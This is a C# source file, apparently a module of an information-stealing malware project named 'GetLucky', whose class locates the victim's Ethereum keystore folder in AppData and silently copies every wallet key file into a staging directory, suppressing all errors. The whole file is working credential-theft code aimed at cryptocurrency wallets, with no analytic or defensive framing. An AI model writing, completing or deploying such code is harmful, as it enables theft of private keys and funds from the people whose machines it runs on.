using System;
using System.IO;

namespace GetLucky
{
    class Ethereum
    {
        public static int count = 0;
        public static string EthereumDir = "\\Wallets\\Ethereum\\";
        public static string EthereumDir2 = Help.AppDate + "\\Ethereum\\keystore";
        public static void EcoinStr(string directorypath)
        {
            try
            {
                if (Directory.Exists(EthereumDir2))
                {
                    foreach (FileInfo file in new DirectoryInfo(EthereumDir2).GetFiles())
                    {
                        Directory.CreateDirectory(directorypath + EthereumDir);
                        file.CopyTo(directorypath + EthereumDir + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }


            }
            catch 
            {
            }
        }
    }
}
